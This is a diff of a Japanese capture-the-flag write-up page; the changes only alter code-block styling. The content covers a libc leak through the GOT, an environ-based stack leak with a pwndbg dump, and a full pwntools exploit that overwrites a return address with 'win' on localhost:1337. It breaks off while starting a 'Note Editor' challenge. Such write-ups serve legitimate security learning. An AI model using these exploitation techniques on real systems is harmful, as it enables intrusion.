@@ -99,8 +99,7 @@
 どうやらASanの所為で、<code>option</code>変数はshadow stackにあり、実際のスタックには無いため、このアドレスは参考にならないという話だった。<br />
 競技中はASanのShadow Stackをずっと掘っており、全く違うことをしていたと気づいて横転した。<br />
 とりあえずlibcを使うexploitなので、dockerがホストしている環境のlibcを解析する。</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>docker cp aa9c9cc2a66e:/lib/x86_64-linux-gnu/libc.so.6 .
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>docker cp aa9c9cc2a66e:/lib/x86_64-linux-gnu/libc.so.6 .</span></span></code></pre>
 <p>これで手元にlibcが落ちてくるからpwntoolsに食わせる。<br />
 2の<code>read</code>で<code>elf.got['system']</code>を送信して<code>system</code>のアドレスをリーク。(なぜか<code>puts</code>等ではうまくlibc baseが算出出来なかったがASanが悪さをしている?)<br />
 リークした<code>system</code>から、相対オフセットを引くことでlibcベースがリーク。<br />
@@ -110,154 +109,147 @@ libcベースがリークしたことによって<code>environ</code>の位置�
 どうやら<code>environ</code>は環境変数へのポインタの配列、これの先頭を持つポインタらしい。<br />
 これらポインタの配列はスタックに配置されるため、これからアドレス下位に下がっていくと、現在のスタックフレームを参照できたりするらしい。<br />
 <code>environ</code>でスタックのアドレスをリークした後、GDBでスタックを除き、リークした値と、mainのリターンアドレスとの差を計算してみる。</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>これはexploit実行時に、environが持つアドレスとしてリークしたもの
-</span><span>environ: 7ffc22e40388
-</span><span>
-</span><span>pwndbg&gt; x/50gx $rsp
-</span><span>0x7ffc22e40160:	0x7776757473727170	0x7f7e7d7c7b7a7978
-</span><span>0x7ffc22e40170:	0x8786858483828180	0x8f8e8d8c8b8a8988
-</span><span>0x7ffc22e40180:	0x9796959493929190	0x9f9e9d9c9b9a9998
-</span><span>0x7ffc22e40190:	0xa7a6a5a4a3a2a1a0	0xafaeadacabaaa9a8
-</span><span>0x7ffc22e401a0:	0xb7b6b5b4b3b2b1b0	0xbfbebdbcbbbab9b8
-</span><span>0x7ffc22e401b0:	0xc7c6c5c4c3c2c1c0	0xcfcecdcccbcac9c8
-</span><span>0x7ffc22e401c0:	0xd7d6d5d4d3d2d1d0	0x000071474bce17bb
-</span><span>0x7ffc22e401d0:	0x000071474be90248	0x000071474bce17bb
-</span><span>0x7ffc22e401e0:	0x000071474be8fdc8	0x000071474be8f880
-</span><span>0x7ffc22e401f0:	0x00007ffc22e40220	0x00007ffc22e40230
-</span><span>0x7ffc22e40200:	0x000071474be91f00	0x7db64fcf6fadbe00
-</span><span>0x7ffc22e40210:	0x0000000000000001	0x7db64fcf6fadbe00
-</span><span>0x7ffc22e40220:	0x0000000000000001	0x0000000000000000
-</span><span>0x7ffc22e40230:	0x00007ffc22e402f0	0x00007ffc22e40378
-</span><span>0x7ffc22e40240:	0x0000000000000001	0x000071474ca05000
-</span><span>0x7ffc22e40250:	0x0000612e61a62d18	0x000071474c0376b5
-</span><span>0x7ffc22e40260:	0x0000000000000008	0x00007ffc22e40378
-</span><span>0x7ffc22e40270:	0x0000000100000000	0x0000612e61a60376
-</span><span>0x7ffc22e40280:	0x0000000000000000	0xd535bf6c9bd293cd
-</span><span>0x7ffc22e40290:	0x00007ffc22e40378	0x0000000000000001
-</span><span>0x7ffc22e402a0:	0x000071474ca05000	0x0000612e61a62d18
-</span><span>0x7ffc22e402b0:	0xd535bf6c9af293cd	0xc84362a272ec93cd
-</span><span>0x7ffc22e402c0:	0x00007ffc00000000	0x0000000000000000
-</span><span>0x7ffc22e402d0:	0x0000000000000000	0x0000612e61a62d10
-</span><span>0x7ffc22e402e0:	0x00007ffc22e40350	0x7db64fcf6fadbe00
-</span><span>pwndbg&gt; retaddr
-</span><span>0x7ffc22e40258 —▸ 0x71474c0376b5 (__libc_start_call_main+117) ◂— mov edi, eax
-</span><span>0x7ffc22e402f8 —▸ 0x71474c037769 (__libc_start_main+137) ◂— mov r14, qword ptr [rip + 0x1be820]
-</span><span>0x7ffc22e40358 —▸ 0x612e61a60245 (_start+37) ◂— hlt 
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>これはexploit実行時に、environが持つアドレスとしてリークしたもの</span></span>
+<span class="giallo-l"><span>environ: 7ffc22e40388</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>pwndbg&gt; x/50gx $rsp</span></span>
+<span class="giallo-l"><span>0x7ffc22e40160:	0x7776757473727170	0x7f7e7d7c7b7a7978</span></span>
+<span class="giallo-l"><span>0x7ffc22e40170:	0x8786858483828180	0x8f8e8d8c8b8a8988</span></span>
+<span class="giallo-l"><span>0x7ffc22e40180:	0x9796959493929190	0x9f9e9d9c9b9a9998</span></span>
+<span class="giallo-l"><span>0x7ffc22e40190:	0xa7a6a5a4a3a2a1a0	0xafaeadacabaaa9a8</span></span>
+<span class="giallo-l"><span>0x7ffc22e401a0:	0xb7b6b5b4b3b2b1b0	0xbfbebdbcbbbab9b8</span></span>
+<span class="giallo-l"><span>0x7ffc22e401b0:	0xc7c6c5c4c3c2c1c0	0xcfcecdcccbcac9c8</span></span>
+<span class="giallo-l"><span>0x7ffc22e401c0:	0xd7d6d5d4d3d2d1d0	0x000071474bce17bb</span></span>
+<span class="giallo-l"><span>0x7ffc22e401d0:	0x000071474be90248	0x000071474bce17bb</span></span>
+<span class="giallo-l"><span>0x7ffc22e401e0:	0x000071474be8fdc8	0x000071474be8f880</span></span>
+<span class="giallo-l"><span>0x7ffc22e401f0:	0x00007ffc22e40220	0x00007ffc22e40230</span></span>
+<span class="giallo-l"><span>0x7ffc22e40200:	0x000071474be91f00	0x7db64fcf6fadbe00</span></span>
+<span class="giallo-l"><span>0x7ffc22e40210:	0x0000000000000001	0x7db64fcf6fadbe00</span></span>
+<span class="giallo-l"><span>0x7ffc22e40220:	0x0000000000000001	0x0000000000000000</span></span>
+<span class="giallo-l"><span>0x7ffc22e40230:	0x00007ffc22e402f0	0x00007ffc22e40378</span></span>
+<span class="giallo-l"><span>0x7ffc22e40240:	0x0000000000000001	0x000071474ca05000</span></span>
+<span class="giallo-l"><span>0x7ffc22e40250:	0x0000612e61a62d18	0x000071474c0376b5</span></span>
+<span class="giallo-l"><span>0x7ffc22e40260:	0x0000000000000008	0x00007ffc22e40378</span></span>
+<span class="giallo-l"><span>0x7ffc22e40270:	0x0000000100000000	0x0000612e61a60376</span></span>
+<span class="giallo-l"><span>0x7ffc22e40280:	0x0000000000000000	0xd535bf6c9bd293cd</span></span>
+<span class="giallo-l"><span>0x7ffc22e40290:	0x00007ffc22e40378	0x0000000000000001</span></span>
+<span class="giallo-l"><span>0x7ffc22e402a0:	0x000071474ca05000	0x0000612e61a62d18</span></span>
+<span class="giallo-l"><span>0x7ffc22e402b0:	0xd535bf6c9af293cd	0xc84362a272ec93cd</span></span>
+<span class="giallo-l"><span>0x7ffc22e402c0:	0x00007ffc00000000	0x0000000000000000</span></span>
+<span class="giallo-l"><span>0x7ffc22e402d0:	0x0000000000000000	0x0000612e61a62d10</span></span>
+<span class="giallo-l"><span>0x7ffc22e402e0:	0x00007ffc22e40350	0x7db64fcf6fadbe00</span></span>
+<span class="giallo-l"><span>pwndbg&gt; retaddr</span></span>
+<span class="giallo-l"><span>0x7ffc22e40258 —▸ 0x71474c0376b5 (__libc_start_call_main+117) ◂— mov edi, eax</span></span>
+<span class="giallo-l"><span>0x7ffc22e402f8 —▸ 0x71474c037769 (__libc_start_main+137) ◂— mov r14, qword ptr [rip + 0x1be820]</span></span>
+<span class="giallo-l"><span>0x7ffc22e40358 —▸ 0x612e61a60245 (_start+37) ◂— hlt </span></span></code></pre>
 <p><code>0x7ffc22e40388 - 0x7ffc22e40258 = 0x130</code>より差は<code>0x130</code>だった。<br />
 つまり、<code>read</code>で<code>environ</code>を読んだ時に出てくるアドレスから<code>0x130</code>を引いた値がリターンアドレスの位置になるため、あとは<code>write</code>でそこに<code>win</code>のアドレスを書き込んで<code>exit</code>で終了すれば<code>win</code>が実行される。</p>
-<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
-</span><span>context.log_level = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">error</span><span style="color:#556633;">&#39;
-</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./nasa</span><span style="color:#556633;">&#39;</span><span>)
-</span><span style="color:#888888;">#libc = elf.libc
-</span><span>libc = </span><span style="color:#ffb964;">ELF</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./libc.so.6</span><span style="color:#556633;">&#39;</span><span>)
-</span><span style="color:#888888;">#p = process(&#39;./nasa&#39;)
-</span><span>p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">localhost</span><span style="color:#556633;">&#39;</span><span>, </span><span style="color:#cf6a4c;">1337</span><span>)
-</span><span>
-</span><span>addr_of_option = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recvline</span><span>().</span><span style="color:#ffb964;">strip</span><span>(), </span><span style="color:#cf6a4c;">16</span><span>)
-</span><span>addr_of_win = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recvline</span><span>().</span><span style="color:#ffb964;">strip</span><span>(), </span><span style="color:#cf6a4c;">16</span><span>)
-</span><span>elf.address = addr_of_win - elf.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">win</span><span style="color:#556633;">&#39;</span><span>]
-</span><span>
-</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">binary base: </span><span>{</span><span style="color:#ffb964;">hex</span><span>(elf.address)}</span><span style="color:#556633;">&#39;</span><span>)
-</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">option: </span><span>{</span><span style="color:#ffb964;">hex</span><span>(addr_of_option)}</span><span style="color:#556633;">&#39;</span><span>)
-</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">win: </span><span>{</span><span style="color:#ffb964;">hex</span><span>(addr_of_win)}</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>
-</span><span>p.</span><span style="color:#ffb964;">recvline</span><span>()
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">2</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">recvline</span><span>()
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span>{</span><span style="color:#ffb964;">hex</span><span>(elf.got[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">system</span><span style="color:#556633;">&#39;</span><span>])}</span><span style="color:#556633;">&#39;</span><span>.</span><span style="color:#ffb964;">encode</span><span>())
-</span><span>
-</span><span>leaked_system = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recv</span><span>(</span><span style="color:#cf6a4c;">12</span><span>), </span><span style="color:#cf6a4c;">16</span><span>)
-</span><span>libc.address = leaked_system - libc.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">system</span><span style="color:#556633;">&#39;</span><span>]
-</span><span style="color:#ffb964;">print</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">libc base: </span><span>{</span><span style="color:#ffb964;">hex</span><span>(libc.address)}</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>
-</span><span>p.</span><span style="color:#ffb964;">recvline</span><span>()
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">2</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">recvlines</span><span>(</span><span style="color:#cf6a4c;">2</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span>{</span><span style="color:#ffb964;">hex</span><span>(libc.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">environ</span><span style="color:#556633;">&#39;</span><span>])}</span><span style="color:#556633;">&#39;</span><span>.</span><span style="color:#ffb964;">encode</span><span>())
-</span><span>retaddr_address = </span><span style="color:#ffb964;">int</span><span>(p.</span><span style="color:#ffb964;">recv</span><span>(</span><span style="color:#cf6a4c;">12</span><span>), </span><span style="color:#cf6a4c;">16</span><span>) - </span><span style="color:#cf6a4c;">0x130
-</span><span>
-</span><span>p.</span><span style="color:#ffb964;">recvlines</span><span>(</span><span style="color:#cf6a4c;">2</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">1</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">recvline</span><span>()
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span>{</span><span style="color:#ffb964;">hex</span><span>(retaddr_address)} {</span><span style="color:#ffb964;">hex</span><span>(addr_of_win)}</span><span style="color:#556633;">&#39;</span><span>.</span><span style="color:#ffb964;">encode</span><span>())
-</span><span>p.</span><span style="color:#ffb964;">recvline</span><span>()
-</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">3</span><span style="color:#556633;">&#39;</span><span>)
-</span><span>p.</span><span style="color:#ffb964;">recvline</span><span>()
-</span><span>
-</span><span style="color:#ffb964;">print</span><span>(p.</span><span style="color:#ffb964;">recvall</span><span>().</span><span style="color:#ffb964;">decode</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">latin-1</span><span style="color:#556633;">&#39;</span><span>))
-</span></code></pre>
-<h2 id="note-editor">Note Editor</h2>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span style="color: #7DCFFF;">from</span><span> pwn</span><span style="color: #7DCFFF;"> import</span><span style="color: #89DDFF;"> *</span></span>
+<span class="giallo-l"><span>context</span><span style="color: #89DDFF;">.</span><span>log_level</span><span style="color: #89DDFF;"> = &#39;</span><span style="color: #9ECE6A;">error</span><span style="color: #89DDFF;">&#39;</span></span>
+<span class="giallo-l"><span>elf</span><span style="color: #89DDFF;"> =</span><span> context</span><span style="color: #89DDFF;">.</span><span>binary</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> ELF</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">./nasa</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">#libc = elf.libc</span></span>
+<span class="giallo-l"><span>libc</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> ELF</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">./libc.so.6</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">#p = process(&#39;./nasa&#39;)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> remote</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">localhost</span><span style="color: #89DDFF;">&#39;,</span><span style="color: #FF9E64;"> 1337</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>addr_of_option</span><span style="color: #89DDFF;"> =</span><span style="color: #0DB9D7;"> int</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvline</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">strip</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 16</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>addr_of_win</span><span style="color: #89DDFF;"> =</span><span style="color: #0DB9D7;"> int</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvline</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">strip</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 16</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>elf</span><span style="color: #89DDFF;">.</span><span>address</span><span style="color: #89DDFF;"> =</span><span> addr_of_win</span><span style="color: #89DDFF;"> -</span><span> elf</span><span style="color: #89DDFF;">.</span><span>sym</span><span style="color: #9ABDF5;">[</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">win</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #0DB9D7;">print</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">f</span><span style="color: #9ECE6A;">&#39;binary base: </span><span style="color: #BB9AF7;">{</span><span style="color: #0DB9D7;">hex</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">elf</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">address</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #0DB9D7;">print</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">f</span><span style="color: #9ECE6A;">&#39;option: </span><span style="color: #BB9AF7;">{</span><span style="color: #0DB9D7;">hex</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">addr_of_option</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #0DB9D7;">print</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">f</span><span style="color: #9ECE6A;">&#39;win: </span><span style="color: #BB9AF7;">{</span><span style="color: #0DB9D7;">hex</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">addr_of_win</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvline</span><span style="color: #9ABDF5;">()</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">2</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvline</span><span style="color: #9ABDF5;">()</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">f</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #BB9AF7;">{</span><span style="color: #0DB9D7;">hex</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">elf</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">got</span><span style="color: #9ABDF5;">[</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">system</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">])</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">encode</span><span style="color: #9ABDF5;">())</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>leaked_system</span><span style="color: #89DDFF;"> =</span><span style="color: #0DB9D7;"> int</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recv</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">12</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 16</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>libc</span><span style="color: #89DDFF;">.</span><span>address</span><span style="color: #89DDFF;"> =</span><span> leaked_system</span><span style="color: #89DDFF;"> -</span><span> libc</span><span style="color: #89DDFF;">.</span><span>sym</span><span style="color: #9ABDF5;">[</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">system</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">]</span></span>
+<span class="giallo-l"><span style="color: #0DB9D7;">print</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">f</span><span style="color: #9ECE6A;">&#39;libc base: </span><span style="color: #BB9AF7;">{</span><span style="color: #0DB9D7;">hex</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">libc</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">address</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvline</span><span style="color: #9ABDF5;">()</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">2</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvlines</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">2</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">f</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #BB9AF7;">{</span><span style="color: #0DB9D7;">hex</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">libc</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">sym</span><span style="color: #9ABDF5;">[</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">environ</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">])</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">encode</span><span style="color: #9ABDF5;">())</span></span>
+<span class="giallo-l"><span>retaddr_address</span><span style="color: #89DDFF;"> =</span><span style="color: #0DB9D7;"> int</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recv</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">12</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 16</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;"> -</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">130</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvlines</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">2</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">1</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvline</span><span style="color: #9ABDF5;">()</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">f</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #BB9AF7;">{</span><span style="color: #0DB9D7;">hex</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">retaddr_address</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;">} {</span><span style="color: #0DB9D7;">hex</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">addr_of_win</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">encode</span><span style="color: #9ABDF5;">())</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvline</span><span style="color: #9ABDF5;">()</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">3</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvline</span><span style="color: #9ABDF5;">()</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #0DB9D7;">print</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">p</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvall</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">decode</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">latin-1</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">))</span></span></code></pre><h2 id="note-editor">Note Editor</h2>
 <p>プログラムを読み解いていく。noteの構造体は以下。</p>
-<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">#define </span><span style="color:#ffb964;">NOTE_SIZE </span><span style="color:#cf6a4c;">1024
-</span><span style="color:#8fbfdc;">struct </span><span style="color:#ffb964;">Note </span><span>{
-</span><span>    </span><span style="color:#8fbfdc;">char</span><span>* buffer;
-</span><span>    size_t size;
-</span><span>    uint32_t budget; 
-</span><span>    uint32_t pos; 
-</span><span>};
-</span><span style="color:#8fbfdc;">typedef struct</span><span> Note </span><span style="color:#ffb964;">Note</span><span>;
-</span></code></pre>
-<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">main</span><span>() {
-</span><span>    Note note;
-</span><span>    </span><span style="color:#8fbfdc;">char</span><span> buffer[NOTE_SIZE];
-</span><span>    
-</span><span>    note = (Note) {
-</span><span>        .</span><span style="color:#ffb964;">buffer </span><span>= buffer,
-</span><span>        .</span><span style="color:#ffb964;">size </span><span>= sizeof(buffer),
-</span><span>        .</span><span style="color:#ffb964;">pos </span><span>= </span><span style="color:#cf6a4c;">0</span><span>, </span><span style="color:#888888;">// -&gt; bufferでのoffsetを持っていると思われる。書き込み位置
-</span><span>        .</span><span style="color:#ffb964;">budget </span><span>= sizeof(buffer) </span><span style="color:#888888;">// -&gt; 残りのバッファサイズ?
-</span><span>    };
-</span><span>	
-</span><span>	</span><span style="color:#888888;">//これは setvbufとかの設定で関係ない
-</span><span>    </span><span style="color:#ffb964;">setup</span><span>();
-</span><span>    </span><span style="color:#888888;">// bufferをsizeのbyte分だけ0埋め、budget = size、pos=0にする
-</span><span>    </span><span style="color:#ffb964;">reset</span><span>(&amp;note);
-</span><span>    
-</span><span>    printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Welcome to the terminal note editor as a service.\n</span><span style="color:#556633;">&quot;</span><span>);
-</span><span>
-</span><span>	</span><span style="color:#888888;">// メニューは1-6以外を受け付けていない
-</span><span>    </span><span style="color:#8fbfdc;">while </span><span>(</span><span style="color:#cf6a4c;">1</span><span>)
-</span><span>    {
-</span><span>        uint32_t choice = </span><span style="color:#ffb964;">menu</span><span>();
-</span><span>        </span><span style="color:#8fbfdc;">switch </span><span>(choice)
-</span><span>        {
